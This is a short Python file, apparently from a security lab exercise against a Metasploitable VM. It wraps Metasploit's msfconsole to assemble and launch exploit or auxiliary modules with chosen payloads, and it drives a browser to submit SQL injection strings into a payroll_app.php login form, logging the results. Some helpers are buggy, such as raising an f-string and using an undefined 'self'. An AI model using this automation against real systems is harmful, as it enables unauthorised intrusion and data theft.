import pexpect

from splinter import Browser

class Exploit:
    def __init__(self, name, type, **kwargs):
        self.name = name
        self.type = type
        self.__intern = kwargs
        for k, v in kwargs.items():
            setattr(self, k, v)

    def __getitem__(self, k):
        return self.__intern[k]

    def __dir__(self):
        return self.__intern

    def build_exploit_command(self):
        command = f'msfconsole -q -x "use {self.type}/'

        for item in self.__dir__():
            if item in ['exploit', 'auxiliary']:
                command += f'{self.exploit}; '
            elif item == 'payload':
                command += f'set payload {self.payload}; '
            else:
                command += f'set {item} {self.__getitem__(item)}; '

        if self.type == "exploit":
            command += 'exploit;"'
        else:
            command += 'run;"'

        return command

    # recupere output 
    def send_command(self, *args):
        with open(f"./my_exploit/{self.name}.txt", "wb") as f:
            child = pexpect.spawn(self.build_exploit_command())
            child.logfile_read = f
            
            for command in args:
                child.sendline(command)
                match_spawn(child, "to_test")

def match_spawn(child, answer):
    try:
        child.expect([answer, pexpect.TIMEOUT])
    except ValueError as e:
        raise f"Error finding {answer} in {self}"

def sql_injection(exo_name, sql_to_inject):
    ip_to_replace = "127.0.0.1" # remplacer par l'ip de la vm metasploit
    
    with Browser() as browser:
        browser.visit(f"http://{ip_to_replace}/payroll_app.php")
        browser.fill('user', f"{sql_to_inject}")
        browser.find_by_value('OK').click()

        with open(f"./my_exploit/{exo_name}.txt", "w") as f:
            f.write(browser.find_by_tag('tbody')[0].text)
